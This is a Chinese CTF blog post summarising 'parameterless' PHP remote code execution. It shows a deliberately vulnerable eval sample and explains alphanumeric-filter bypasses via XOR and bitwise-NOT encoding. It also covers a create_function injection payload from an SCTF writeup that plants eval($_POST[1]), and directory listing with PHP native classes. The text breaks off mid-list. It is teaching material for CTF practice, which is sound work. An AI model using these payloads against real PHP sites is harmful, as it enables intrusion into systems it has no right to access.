<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Siii0"><meta name="copyright" content="Siii0"><meta name="generator" content="Hexo 6.0.0"><meta name="theme" content="hexo-theme-yun"><title>无参RCE 总结 | Siii0的博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"siii0.github.io","root":"/","title":"Siii0","version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="一、无参RCE 介绍什么是无参RCE？ RCE英文全称：remote command&#x2F;code execute 分为远程命令执行ping和远程代码执行evel 本次总结的是远程代码执行eval 而没有参数，就是形似eval(qwe())这种无限嵌套的RCE 二、主要函数在我看来，无参RCE主要就是一些函数的利用 一些主要的比较危险的函数肯定要知道 比如：system(),exec(),scandi">
<meta property="og:type" content="article">
<meta property="og:title" content="无参RCE 总结">
<meta property="og:url" content="http://siii0.github.io/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="Siii0的博客">
<meta property="og:description" content="一、无参RCE 介绍什么是无参RCE？ RCE英文全称：remote command&#x2F;code execute 分为远程命令执行ping和远程代码执行evel 本次总结的是远程代码执行eval 而没有参数，就是形似eval(qwe())这种无限嵌套的RCE 二、主要函数在我看来，无参RCE主要就是一些函数的利用 一些主要的比较危险的函数肯定要知道 比如：system(),exec(),scandi">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://siii0.github.io/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/image-20220108222001066.png">
<meta property="og:image" content="http://siii0.github.io/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/image-20220108223430023.png">
<meta property="article:published_time" content="2022-01-22T02:47:09.511Z">
<meta property="article:modified_time" content="2022-01-22T02:52:49.678Z">
<meta property="article:author" content="Siii0">
<meta property="article:tag" content="RCE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://siii0.github.io/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/image-20220108222001066.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Siii0"><img width="96" loading="lazy" src="/images/tom.jpg" alt="Siii0"></a><div class="site-author-name"><a href="/about/">Siii0</a></div><span class="site-name">Siii0的博客</span><sub class="site-subtitle"></sub><div class="site-desciption">如果你停止，就是谷底，如果你还在继续，就是上坡。</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">21</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">15</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ 2373589667" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="微信 Siiioz" target="_blank" style="color:#1AAD19"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-2-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="E-Mail 2373589667@qq.com" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%97%A0%E5%8F%82RCE-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">一、无参RCE 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%B8%BB%E8%A6%81%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">二、主要函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">3.</span> <span class="toc-text">三、无数字字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%BC%82%E6%88%96"><span class="toc-number">3.1.</span> <span class="toc-text">1、异或 ^</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%8F%96%E5%8F%8D"><span class="toc-number">3.2.</span> <span class="toc-text">2、取反 ~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81PHP%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">3、PHP的原生类的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8F%AF%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB"><span class="toc-number">3.3.1.</span> <span class="toc-text">一、可遍历目录类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB"><span class="toc-number">3.3.2.</span> <span class="toc-text">二、可读取文件类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">知识点：</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://Siii0.github.io/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Siii0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Siii0的博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">无参RCE 总结</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2022-01-22 10:47:09" itemprop="dateCreated datePublished" datetime="2022-01-22T10:47:09+08:00">2022-01-22</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/RCE/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">RCE</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="一、无参RCE-介绍"><a href="#一、无参RCE-介绍" class="headerlink" title="一、无参RCE 介绍"></a>一、无参RCE 介绍</h2><p>什么是无参RCE？</p>
<p><strong>RCE英文全称：remote command/code execute</strong></p>
<p><strong>分为远程命令执行ping和远程代码执行evel</strong></p>
<p>本次总结的是远程代码执行eval</p>
<p>而没有参数，就是形似<code>eval(qwe())</code>这种无限嵌套的RCE</p>
<h2 id="二、主要函数"><a href="#二、主要函数" class="headerlink" title="二、主要函数"></a>二、主要函数</h2><p>在我看来，无参RCE主要就是一些函数的利用</p>
<p>一些主要的比较危险的函数肯定要知道</p>
<p>比如：system(),exec(),scandir()等等</p>
<p>这里列举一些特殊的函数，也是无参RCE中能利用的</p>
<pre class="line-numbers language-none"><code class="language-none">1.localeconv() 
函数返回一包含本地数字及货币格式信息的数组
第一个元素是&#96;.&#96;,配合scandir使用

2.current() 别名是 pos()
获取数组的第一个元素

3.next()
函数将内部指针指向数组中的下一个元素，并返回该元素
内部指针初始位置为第一个，一次next()就是第二个

4.array_reverse()
以相反的元素顺序返回数组

5.array_flip()
交换数组的键和值

6.getallheaders()
获取当前请求的所有请求头信息
exec(getallheaders())
就是返回请求头的最后一行

7.end()
输出数组中的当前元素和最后一个元素的值
也可以配合getallheaders()使用
end(getallheaders())

https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;func-array-end.html
一些数组操作，可以看这个网址

8.session_id()

9.get_defined_vars()

	......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="三、无数字字母RCE"><a href="#三、无数字字母RCE" class="headerlink" title="三、无数字字母RCE"></a>三、无数字字母RCE</h2><p><strong>源码：</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不能输入数字字母，就要想办法构造出数字字母</p>
<h3 id="1、异或"><a href="#1、异或" class="headerlink" title="1、异或 ^"></a>1、异或 ^</h3><p>例如:<code>@ ^ ! = a</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token variable">$a</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'#'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'('</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">')'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'@'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">']'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'^'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#125;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'~'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$b</span></span>^<span class="token interpolation"><span class="token variable">$c</span></span>="</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">^</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直接把所有的异或情况列出来，然后取构造想要的函数就好了</p>
<h3 id="2、取反"><a href="#2、取反" class="headerlink" title="2、取反 ~"></a>2、取反 ~</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 %8C%86%8C%8B%9A%92 </span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于取反后，会有很多不可见字符，所以url编码一下输出就好了</p>
<p>GET请求方式会自行进行url解码</p>
<p>所以 <code>code=~(%8C%86%8C%8B%9A%92)</code>就能绕过正则</p>
<p>最后的code就是system</p>
<p><strong>这里还有一道SCTF的一道类似的题</strong></p>
<p><img src="/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/image-20220108222001066.png" alt="image-20220108222001066" loading="lazy"></p>
<p>无参而且无字母数字，并且过滤了非常多的函数</p>
<p>学习一下官方WP</p>
<p><img src="/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/image-20220108223430023.png" alt="image-20220108223430023" loading="lazy"></p>
<p>最后传入的<code>code</code>就是：</p>
<p><code>call_user_func(&#39;creat_funtion&#39;,&#39;&#39;,&#39;&#125;eval($_POST[1]);/*&#39;)</code></p>
<p>等价于</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">create_funtion</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&#125;eval($_POST[1]);/*'</span><span class="token punctuation">)</span>
    
<span class="token comment">//等价于</span>
    
<span class="token keyword">function</span> <span class="token function-definition function">lambda_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那其实就相当于，写入了<code>eval($_POST[1]);</code></p>
<p>接下来就可以对<code>1</code>进行传参</p>
<h3 id="3、PHP的原生类的利用"><a href="#3、PHP的原生类的利用" class="headerlink" title="3、PHP的原生类的利用"></a>3、PHP的原生类的利用</h3><p>通过函数<code>get_declared_classes()</code>查看已定义的类（就是php的原生类）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span> 
/*
Array
(
    [0] => stdClass
    [1] => Exception
    [2] => ErrorException
    [3] => Error
    [4] => CompileError
    [5] => ParseError
    [6] => TypeError
    [7] => ArgumentCountError
    [8] => ArithmeticError
    [9] => DivisionByZeroError
    [10] => Closure
    [11] => Generator
    [12] => ClosedGeneratorException
    [13] => WeakReference
    [14] => DateTime
    [15] => DateTimeImmutable
    [16] => DateTimeZone
    [17] => DateInterval
    [18] => DatePeriod
    [19] => LibXMLError
    [20] => SQLite3
    [21] => SQLite3Stmt
    [22] => SQLite3Result
    [23] => DOMException
    [24] => DOMStringList
    [25] => DOMNameList
    [26] => DOMImplementationList
    [27] => DOMImplementationSource
    [28] => DOMImplementation
    [29] => DOMNode
    [30] => DOMNameSpaceNode
    [31] => DOMDocumentFragment
    [32] => DOMDocument
    [33] => DOMNodeList
    [34] => DOMNamedNodeMap
    [35] => DOMCharacterData
    [36] => DOMAttr
    [37] => DOMElement
    [38] => DOMText
    [39] => DOMComment
    [40] => DOMTypeinfo
    [41] => DOMUserDataHandler
    [42] => DOMDomError
    [43] => DOMErrorHandler
    [44] => DOMLocator
    [45] => DOMConfiguration
    [46] => DOMCdataSection
    [47] => DOMDocumentType
    [48] => DOMNotation
    [49] => DOMEntity
    [50] => DOMEntityReference
    [51] => DOMProcessingInstruction
    [52] => DOMStringExtend
    [53] => DOMXPath
    [54] => finfo
    [55] => HashContext
    [56] => JsonException
    [57] => LogicException
    [58] => BadFunctionCallException
    [59] => BadMethodCallException
    [60] => DomainException
    [61] => InvalidArgumentException
    [62] => LengthException
    [63] => OutOfRangeException
    [64] => RuntimeException
    [65] => OutOfBoundsException
    [66] => OverflowException
    [67] => RangeException
    [68] => UnderflowException
    [69] => UnexpectedValueException
    [70] => RecursiveIteratorIterator
    [71] => IteratorIterator
    [72] => FilterIterator
    [73] => RecursiveFilterIterator
    [74] => CallbackFilterIterator
    [75] => RecursiveCallbackFilterIterator
    [76] => ParentIterator
    [77] => LimitIterator
    [78] => CachingIterator
    [79] => RecursiveCachingIterator
    [80] => NoRewindIterator
    [81] => AppendIterator
    [82] => InfiniteIterator
    [83] => RegexIterator
    [84] => RecursiveRegexIterator
    [85] => EmptyIterator
    [86] => RecursiveTreeIterator
    [87] => ArrayObject
    [88] => ArrayIterator
    [89] => RecursiveArrayIterator
    [90] => SplFileInfo
    [91] => DirectoryIterator
    [92] => FilesystemIterator
    [93] => RecursiveDirectoryIterator
    [94] => GlobIterator
    [95] => SplFileObject
    [96] => SplTempFileObject
    [97] => SplDoublyLinkedList
    [98] => SplQueue
    [99] => SplStack
    [100] => SplHeap
    [101] => SplMinHeap
    [102] => SplMaxHeap
    [103] => SplPriorityQueue
    [104] => SplFixedArray
    [105] => SplObjectStorage
    [106] => MultipleIterator
    [107] => PDOException
    [108] => PDO
    [109] => PDOStatement
    [110] => PDORow
    [111] => SessionHandler
    [112] => ReflectionException
    [113] => Reflection
    [114] => ReflectionFunctionAbstract
    [115] => ReflectionFunction
    [116] => ReflectionGenerator
    [117] => ReflectionParameter
    [118] => ReflectionType
    [119] => ReflectionNamedType
    [120] => ReflectionMethod
    [121] => ReflectionClass
    [122] => ReflectionObject
    [123] => ReflectionProperty
    [124] => ReflectionClassConstant
    [125] => ReflectionExtension
    [126] => ReflectionZendExtension
    [127] => ReflectionReference
    [128] => __PHP_Incomplete_Class
    [129] => php_user_filter
    [130] => Directory
    [131] => AssertionError
    [132] => SimpleXMLElement
    [133] => SimpleXMLIterator
    [134] => PharException
    [135] => Phar
    [136] => PharData
    [137] => PharFileInfo
    [138] => XMLReader
    [139] => XMLWriter
)
*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="一、可遍历目录类"><a href="#一、可遍历目录类" class="headerlink" title="一、可遍历目录类"></a>一、可遍历目录类</h4><p>1.<code>DirectoryIterator</code></p>
<p>参数为一个目录的路径</p>
<p>该目录下的每个文件都是该类的实例，有自带的方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//遍历目录下的所有文件</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获得该类的所有方法</span>
<span class="token comment">#print_r(get_class_methods($dir))</span>
<span class="token comment">//1、foreach直接循环</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">Array</span>  <span class="token comment">//所有方法</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=></span> __construct
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFilename
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=></span> getExtension
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=></span> getBasename
    <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=></span> isDot
    <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=></span> rewind
    <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=></span> valid
    <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=></span> key
    <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=></span> current
    <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=></span> next
    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=></span> seek
    <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=></span> __toString
    <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPath
    <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPathname
    <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPerms
